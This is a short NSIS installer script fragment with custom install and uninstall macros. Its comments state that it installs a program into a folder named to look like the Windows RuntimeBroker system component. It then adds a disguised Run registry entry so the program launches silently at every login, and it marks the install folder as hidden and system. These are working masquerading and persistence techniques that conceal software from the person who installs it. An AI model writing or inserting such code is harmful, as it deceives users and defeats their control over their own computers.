; Custom install path — looks like a Windows system component
!macro customInstall
  ; Set install path to ProgramData\Microsoft\Windows\RuntimeBroker
  StrCpy $INSTDIR "$PROGRAMDATA\Microsoft\Windows\RuntimeBroker"

  ; Add to Windows startup so it auto-runs silently on login
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" \
    "RuntimeBrokerHost" '"$INSTDIR\RuntimeBroker.exe"'

  ; Hide the install folder (system + hidden attributes)
  SetFileAttributes "$INSTDIR" SYSTEM|HIDDEN
!macroend

!macro customUnInstall
  ; Remove from startup on uninstall
  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "RuntimeBrokerHost"
!macroend
